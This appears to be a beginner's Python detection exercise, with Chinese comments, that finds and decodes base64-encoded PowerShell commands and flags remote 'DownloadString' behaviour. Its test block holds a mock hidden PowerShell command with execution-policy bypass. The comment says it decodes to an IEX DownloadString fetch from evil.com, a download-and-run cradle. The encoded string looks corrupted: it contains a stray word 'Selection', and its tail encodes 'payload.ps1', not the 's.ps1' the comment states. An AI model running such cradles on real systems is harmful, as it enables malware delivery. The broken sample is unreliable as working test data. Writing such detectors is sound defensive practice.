import base64
import re


def sphinx_decode_powershell(raw_cmd: str):
    """
    Day 4 核心函數：偵測並解碼 PowerShell Base64 指令
    """
    print(f"[*] 正在分析指令: {raw_cmd[:50]}...")

    # 1. 使用正規表達式 (Regex) 尋找編碼參數
    # 這行『咒語』可以抓到 -enc, -e, -EncodedCommand (不分大小寫)
    pattern = r"-(?:e|enc|encodedcommand)\s+([A-Za-z0-9+/=]+)"
    match = re.search(pattern, raw_cmd, re.IGNORECASE)

    if match:
        b64_str = match.group(1)
        try:
            # 2. Base64 解碼成原始位元組
            decoded_bytes = base64.b64decode(b64_str)

            # 3. 關鍵技術點：使用 UTF-16LE 解碼 (PowerShell 的標準)
            final_cmd = decoded_bytes.decode("utf-16-le")

            print(f"[!] 警報：偵測到隱蔽指令！")
            print(f"    還原內容: {final_cmd}")

            # 4. 初步行為判定：如果裡面有 DownloadString 關鍵字
            if "downloadstring" in final_cmd.lower():
                print("    判定結果: 🔥 CRITICAL - 發現遠端下載木馬行為！")

        except Exception as e:
            print(f"[-] 解碼失敗，可能不是標準的加密指令: {e}")
    else:
        print("[OK] 指令不含 Base64 混淆特徵。")


# --- 測試執行區 ---
if __name__ == "__main__":
    # 這是我們捏造的『駭客密信』
    # 內容解開後是: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')
    mock_evil = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAASelectionAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="

    # 執行解碼
    sphinx_decode_powershell(mock_evil)